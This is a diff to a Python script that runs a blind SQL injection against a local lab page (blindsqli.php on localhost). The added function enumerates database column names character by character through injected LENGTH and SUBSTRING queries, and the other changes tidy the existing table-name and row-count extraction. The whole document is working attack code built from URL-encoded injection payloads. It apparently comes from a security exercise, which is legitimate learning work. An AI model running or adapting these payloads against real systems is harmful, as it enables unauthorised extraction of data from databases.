@@ -46,7 +46,7 @@ def find_name(my_cookies, length):
             response = requests.get(url, cookies = my_cookies)
 
             if "wonderland" in response.text:
-                print(f"The char in position {position} is {char}")
+                #print(f"The char in position {position} is {char}")
                 result += char
                 found = True
                 break
@@ -57,7 +57,7 @@ def find_name(my_cookies, length):
 
     return result
 
-# This function receives the name of the table we found and receives the number of rows in it by using blind sqli
+# This function receives the name of the table we found and returns the number of rows in it by using blind sqli
 # techniques
 def find_row_count(my_cookies, name):
     for i in range(1000):
@@ -70,19 +70,79 @@ def find_row_count(my_cookies, name):
 
     return -1
 
+# This function receives the name of the table we found and returns a list of the names of the columns
+def find_columns(my_cookies, name):
+
+    # I assume the name of the columns is only english characters, numbers, and underscore. I will add more characters
+    # as needed
+    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
+
+    columns = []
+
+    # Which column we are looking at
+    offset = 0
+
+    # We will break
+    while True:
+        # The length of the current column
+        current_length = -1
+        current_name = ""
+
+        # Checking what is the length of the current column (assuming it is between 1 and 50)
+        for i in range(1, 51):
+            url = (f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20LENGTH((SELECT%20column_name%20FROM%"
+                   f"20information_schema.columns%20WHERE%20table_name=%27{name}%27%20LIMIT%201%20OFFSET%20{offset}))"
+                   f"={i};--%20")
+
+            response = requests.get(url, cookies = my_cookies)
+
+            if "wonderland" in response.text:
+                current_length = i
+                break
+
+        # If the length of the current column is not between 1 and 50 I assume we just finished iterating over the
+        # columns
+        if current_length == -1:
+            return columns
+
+        for i in range(1, current_length + 1):
+            found = False
+            for char in charset:
+                url = (
+                    f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20SUBSTRING((SELECT%20column_name%20FROM%"
+                    f"20information_schema.columns%20WHERE%20table_name=%27{name}%27%20LIMIT%201%20OFFSET%20{offset})"
+                    f",{i},1)=%27{char}%27;--%20")
+
+                response = requests.get(url, cookies = my_cookies)
+
+                if "wonderland" in response.text:
+                    found = True
+                    current_name += char
+                    break
+
+            if not found:
+                print("WEIRD CHARACTERS!")
+                exit(1)
+
+        columns.append(current_name)
+        offset += 1
+
 def main():
 
     # The cookie in order to log in as alice
-    my_cookies = {"PHPSESSID": ""}
+    my_cookies = {"PHPSESSID": "INSERT_YOUR_COOKIE_HERE"}
 
     length = find_length(my_cookies)
-    print(f"The length of the table name is: {length}\n\n")
+    print(f"The length of the table name is: {length}")
 
     name = find_name(my_cookies, length)
-    print(f"\n The name of the table is: {name}")
+    print(f"\nThe name of the table is: {name}")
 
     row_count = find_row_count(my_cookies, name)
-    print(f"\n The row count is: {row_count}")
+    print(f"\nThe row count is: {row_count}")
+
+    columns = find_columns(my_cookies, name)
+    print(f"\nThe columns are: {columns}")
 
 if __name__ == "__main__":
     main()
